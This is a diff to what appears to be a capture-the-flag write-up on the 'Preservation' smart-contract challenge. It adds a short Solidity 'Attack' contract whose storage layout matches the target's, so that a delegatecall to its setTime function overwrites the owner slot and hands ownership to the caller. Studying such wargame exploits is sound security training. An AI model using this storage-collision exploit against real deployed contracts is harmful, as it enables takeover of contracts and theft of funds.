@@ -57,3 +57,19 @@ The **Preservation** contract is a smart contract that allows users to set the t
 
 
 # Subverting
+
+```solidity
+pragma solidity ^0.8.20;
+
+contract Attack{
+    
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function setTime(uint _time)public{
+        owner = msg.sender;
+    }
+
+}
+```
